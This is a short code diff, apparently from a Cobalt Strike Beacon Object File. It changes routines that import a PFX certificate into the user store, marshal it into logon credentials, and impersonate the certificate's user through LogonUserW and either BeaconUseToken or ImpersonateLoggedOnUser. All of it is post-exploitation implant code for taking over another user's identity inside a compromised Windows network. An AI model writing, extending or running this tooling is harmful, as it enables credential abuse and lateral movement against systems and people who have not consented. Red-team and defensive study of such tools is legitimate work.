@@ -35,7 +35,12 @@ HCERTSTORE LoadCert(unsigned char * cert, const wchar_t * password, DWORD certle
         return NULL;
     }
 
-	HCERTSTORE store = CRYPT32$PFXImportCertStore(&pfxData, password, CRYPT_USER_KEYSET);
+	HCERTSTORE store = CRYPT32$PFXImportCertStore(&pfxData, NULL, CRYPT_USER_KEYSET);
+	if(store == NULL)
+	{
+		internal_printf("Failed to improt cert, make sure its in the right format: %x\n", KERNEL32$GetLastError());
+		return NULL;
+	}
 	*pcert = CRYPT32$CertEnumCertificatesInStore(store, NULL);
 	CRYPT32$CertAddCertificateContextToStore(hCertStore, *pcert, CERT_STORE_ADD_ALWAYS, &pnewcert);
 	CRYPT32$CertDeleteCertificateFromStore(*pcert);
@@ -66,18 +71,22 @@ void ImpersonateUser(PCCERT_CONTEXT pCertContext)
 		BeaconPrintf(CALLBACK_ERROR, "Failed to marshal creds: %d", KERNEL32$GetLastError());
 		return;
 	}
-	BeaconPrintf(CALLBACK_OUTPUT, "success");
 	HANDLE hToken = NULL;
 	if(!ADVAPI32$LogonUserW(creds, NULL, NULL, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken))
 	{
 		BeaconPrintf(CALLBACK_ERROR, "Failed to Logon: %d", KERNEL32$GetLastError());
 		return;
 	}
+	#ifdef COBALTSTRIKE
+	BeaconUseToken(hToken); //This does not appear to properly show the correct user currently, but leaving it for when CS fixes it.
+	#else
 	if(!ADVAPI32$ImpersonateLoggedOnUser(hToken))
 	{
 		BeaconPrintf(CALLBACK_ERROR, "Failed to impersonate: %d", KERNEL32$GetLastError());
 		return;
 	}
+	#endif
+	BeaconPrintf(CALLBACK_OUTPUT, "success");
 
 }
 
